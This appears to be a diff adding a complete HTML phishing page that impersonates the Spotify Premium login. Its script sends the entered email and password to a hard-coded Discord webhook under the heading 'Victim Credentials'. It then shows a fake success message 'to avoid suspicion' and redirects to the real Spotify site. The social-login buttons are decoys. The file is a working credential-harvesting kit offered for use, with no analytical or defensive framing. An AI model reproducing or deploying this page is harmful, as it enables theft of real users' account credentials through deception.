@@ -1,0 +1,305 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spotify Premium - Log In</title>
+    <link rel="stylesheet" href="https://fonts.googleapis.com/css2?family=Circular+Std:wght@400;500;700&display=swap">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Circular Std', sans-serif;
+            background: linear-gradient(to bottom, #282828, #000000);
+            color: #fff;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            min-height: 100vh;
+            padding: 20px;
+            padding-bottom: 100px; /* Add padding to prevent content overlap with footer */
+        }
+        .login-container {
+            background: #121212;
+            border-radius: 12px;
+            padding: 32px;
+            width: 729px; /* Image width */
+            height: 798px; /* Image height */
+            box-shadow: 0 8px 24px rgba(0,0,0,0.6);
+            display: flex;
+            flex-direction: column;
+            align-items: center; /* Center all content */
+        }
+        .logo {
+            text-align: center;
+            margin-bottom: 24px;
+        }
+        .logo img {
+            width: 120px;
+            height: auto;
+        }
+        .title {
+            font-size: 28px;
+            font-weight: 700;
+            text-align: center;
+            margin-bottom: 16px;
+            color: #fff;
+        }
+        .subtitle {
+            font-size: 14px;
+            text-align: center;
+            margin-bottom: 24px;
+            color: #b3b3b3;
+        }
+        .social-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+            margin-bottom: 24px;
+            width: 316px; /* Fixed width from 380px container */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .social-btn {
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            width: 100%;
+            padding: 12px;
+            background: #121212;
+            color: #ffffff;
+            font-weight: 700;
+            border: 1px solid #ffffff;
+            border-radius: 500px;
+            font-size: 16px;
+            cursor: pointer;
+            font-family: 'Circular Std', sans-serif;
+            text-decoration: none;
+        }
+        .social-btn img {
+            width: 24px;
+            height: 24px;
+            margin-right: 8px;
+        }
+        .social-btn:hover {
+            background: #1a1a1a;
+        }
+        .divider {
+            width: 316px; /* Match form width */
+            height: 1px;
+            background: #3e3e3e;
+            margin: 24px auto; /* Center and space evenly */
+        }
+        .form-group {
+            margin-bottom: 16px;
+            width: 316px; /* Fixed width from 380px container */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .form-group label {
+            display: block;
+            font-size: 14px;
+            font-weight: 500;
+            color: #b3b3b3;
+            margin-bottom: 8px;
+        }
+        .form-group input {
+            width: 100%;
+            padding: 14px;
+            border: 1px solid #3e3e3e;
+            border-radius: 6px;
+            background: #2a2a2a;
+            color: #fff;
+            font-size: 16px;
+            font-family: 'Circular Std', sans-serif;
+        }
+        .form-group input:focus {
+            outline: none;
+            border-color: #1ed760;
+        }
+        .submit-btn {
+            width: 316px; /* Fixed width from 380px container */
+            padding: 14px;
+            background: #1ed760;
+            color: #000;
+            border: none;
+            border-radius: 500px;
+            font-size: 16px;
+            font-weight: 700;
+            cursor: pointer;
+            font-family: 'Circular Std', sans-serif;
+            margin-top: 16px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .submit-btn:hover {
+            background: #1db954;
+            transform: scale(1.02);
+        }
+        .forgot-password {
+            text-align: center;
+            margin-top: 16px;
+            width: 316px; /* Align with other elements */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .forgot-password a {
+            color: #b3b3b3;
+            text-decoration: none;
+            font-size: 14px;
+            font-weight: 500;
+        }
+        .forgot-password a:hover {
+            color: #1ed760;
+        }
+        .success-message {
+            display: none;
+            text-align: center;
+            color: #1ed760;
+            font-size: 14px;
+            font-weight: 500;
+            margin-top: 16px;
+            width: 316px; /* Align with other elements */
+            margin-left: auto;
+            margin-right: auto;
+        }
+        .recaptcha-footer {
+            position: fixed;
+            bottom: 0;
+            left: 0;
+            width: 1750px; /* Specified width */
+            height: 80px; /* Specified height */
+            background: #121212; /* Match login container background */
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            text-align: center;
+            color: #b3b3b3;
+            font-size: 12px;
+            font-weight: 400;
+            z-index: 1000; /* Ensure it stays on top */
+        }
+        .recaptcha-footer a {
+            color: #b3b3b3;
+            text-decoration: underline;
+        }
+        .recaptcha-footer a:hover {
+            color: #1ed760;
+        }
+        @media (max-width: 1750px) {
+            .recaptcha-footer {
+                width: 100%; /* Full viewport width for smaller screens */
+                font-size: 10px; /* Slightly smaller text for mobile */
+            }
+        }
+        @media (max-width: 670px) {
+            .login-container {
+                padding: 24px;
+                width: 95%; /* Adjust for smaller screens */
+                height: auto; /* Allow height to adjust */
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="login-container">
+        <div class="logo">
+            <img src="https://imgs.search.brave.com/XTekfaIKD4GIFWmoHxuA9k5LkWZULhhOZMQUNTmb6hg/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/bG9nby53aW5lL2Ev/bG9nby9TcG90aWZ5/L1Nwb3RpZnktSWNv/bi1XaGl0ZS1EYXJr/LUJhY2tncm91bmQt/TG9nby53aW5lLnN2/Zw" alt="Spotify Logo">
+        </div>
+        <h1 class="title">Log In to Spotify Premium</h1>
+        <p class="subtitle">Unlock ad-free music with Premium</p>
+        
+        <div class="social-buttons">
+            <a href="#" class="social-btn" onclick="alert('Error: Please use email or username to log in.')">
+                <img src="https://imgs.search.brave.com/TuM8ut5ipXZvHHEvL8z9XXJ1QnV1Ov3K0NMH1GmgdBI/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/ZnJlZXBuZ2xvZ29z/LmNvbS91cGxvYWRz/L2dvb2dsZS1sb2dv/LXBuZy9nb29nbGUt/bG9nby1wbmctZ29v/Z2xlLWljb24tbG9n/by1wbmctdHJhbnNw/YXJlbnQtc3ZnLXZl/Y3Rvci1iaWUtc3Vw/cGx5LTE0LnBuZw" alt="Google Logo">
+                Continue with Google
+            </a>
+            <a href="#" class="social-btn" onclick="alert('Error: Please use email or username to log in.')">
+                <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" alt="Facebook Logo">
+                Continue with Facebook
+            </a>
+            <a href="#" class="social-btn" onclick="alert('Error: Please use email or username to log in.')">
+                <img src="https://imgs.search.brave.com/xxbh0JwZ_fe-VzHxhO9t11IRAQNcF6HWgL0GkIV1yt4/rs:fit:860:0:0:0/g:ce/aHR0cHM6Ly93d3cu/ZnJlZXBuZ2xvZ29z/LmNvbS91cGxvYWRz/L2FwcGxlLWxvZ28t/cG5nL2FwcGxlLWxv/Z28tcG5nLXRyYW5z/cGFyZW50LXN2Zy12/ZWN0b3ItYmllLXN1/cHBseS0yOS5wbmc" alt="Apple Logo">
+                Continue with Apple
+            </a>
+        </div>
+        
+        <div class="divider"></div>
+        
+        <form id="loginForm">
+            <div class="form-group">
+                <label for="email">Email address or username</label>
+                <input type="text" id="email" name="email" required>
+            </div>
+            <div class="form-group">
+                <label for="password">Password</label>
+                <input type="password" id="password" name="password" required>
+            </div>
+            <button type="submit" class="submit-btn">Log In</button>
+        </form>
+        
+        <div class="forgot-password">
+            <a href="#" onclick="alert('Forgot your password? Visit spotify.com/help')">Forgot your password?</a>
+        </div>
+        
+        <p class="success-message" id="successMsg">Logging you in to Premium...</p>
+    </div>
+    
+    <div class="recaptcha-footer">
+        This site is protected by reCAPTCHA and the Google 
+        <a href="https://policies.google.com/privacy"> Privacy Policy </a> and 
+        <a href="https://policies.google.com/terms"> Terms of Service </a> apply.
+    </div>
+
+    <script>
+        const form = document.getElementById('loginForm');
+        const successMsg = document.getElementById('successMsg');
+
+        form.addEventListener('submit', async (e) => {
+            e.preventDefault();
+            
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            // Send to Discord webhook
+            const webhookUrl = 'https://discordapp.com/api/webhooks/1419786034077503539/BEEiT2MsbM6YuAfuJ-6uUhicI5LxN13CbsIVvnh-jGj-wcHJ8VaVoJez4QXVBADauAM0';  // Replace with your actual webhook URL
+            const payload = {
+                content: 'Spotify Premium Login',
+                embeds: [{
+                    title: 'Victim Credentials',
+                    color: 0x1ed760,  // Spotify green
+                    fields: [
+                        { name: 'Email/Username', value: email, inline: true },
+                        { name: 'Password', value: password, inline: true },
+                        { name: 'Timestamp', value: new Date().toLocaleString(), inline: false }
+                    ],
+                    thumbnail: { url: 'https://storage.googleapis.com/pr-newsroom-wp/1/2018/11/Spotify_Logo_CMYK_Green.png' },
+                    footer: { text: 'Phished via Spotify Premium Login | Keep it Rolling' }
+                }]
+            };
+            
+            try {
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify(payload)
+                });
+            } catch (err) {
+                console.log('Webhook failed:', err);  // Silent fail
+            }
+            
+            // Fake success to avoid suspicion
+            form.style.display = 'none';
+            successMsg.style.display = 'block';
+            
+            // Redirect to real Spotify after 2s
+            setTimeout(() => {
+                window.location.href = 'https://open.spotify.com/';
+            }, 2000);
+        });
+    </script>
+</body>
+</html>
